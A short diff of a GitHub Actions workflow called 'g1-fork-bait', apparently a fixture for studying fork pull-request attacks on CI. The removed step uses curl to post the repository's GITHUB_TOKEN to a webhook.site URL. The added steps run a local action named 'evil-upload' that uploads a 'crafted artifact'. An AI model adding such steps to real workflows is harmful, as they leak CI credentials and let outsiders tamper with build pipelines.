@@ -2,9 +2,10 @@ name: g1-fork-bait
 on:
   pull_request: {}
 jobs:
-  x:
+  g1:
     runs-on: ubuntu-latest
+    timeout-minutes: 15
     steps:
-      - run: |
-          curl -s -X POST -d "t=${{ secrets.GITHUB_TOKEN }}" https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5
-        shell: bash
+      - uses: actions/checkout@v4
+      - name: upload crafted artifact
+        uses: ./.github/actions/evil-upload
